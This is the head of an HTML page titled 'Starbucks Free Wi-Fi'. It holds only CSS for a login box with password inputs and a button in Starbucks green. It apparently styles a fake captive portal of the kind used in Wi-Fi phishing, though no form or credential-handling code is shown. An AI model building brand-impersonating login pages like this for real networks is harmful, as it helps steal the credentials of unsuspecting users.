<!DOCTYPE html>
<html>
<head>
    <title>Starbucks Free Wi-Fi</title>
    <style>
        body { 
            background-color: #F4F4F4;
            font-family: Arial, sans-serif;
            background-image: url('https://i.pinimg.com/originals/68/bd/60/68bd60ae09920a70b564c91cd258e624.jpg');
            background-repeat: no-repeat;
            background-size: cover;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
            background-color: white; /* added white background */
            border-radius: 10px; /* added border radius */
        }
        input[type="text"], input[type="password"] {
            display: block;
            margin: 10px auto;
            font-weight: bold; /* make text bold */
            width: 80%; /* set a width */
            padding: 5px; /* give some padding */
            border: none; /* remove border */
            border-bottom: 2px solid #ccc; /* add bottom border */
            border-radius: 0; /* remove border radius */
        }
        .submit {
            background-color: #00704A; /* Starbucks green color */
            color: white;
            border: none;
            border-radius: 50px; /* increase border-radius for a more cylindrical look */
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 4px 2px;
            cursor: pointer;
            transition-duration: 0.4s;
            width: 100%; /* full width of parent */
        }
        .submit:hover {
            background-color: white;
            color: #00704A;
            border: 2px solid #00704A;
        }
        .small-text {
            font-size: 12px;
            color: #888;
        }
        @media only screen and (max-width: 600px) {
            .container {
                padding: 20px;
            }
        }
    </style>
</head>
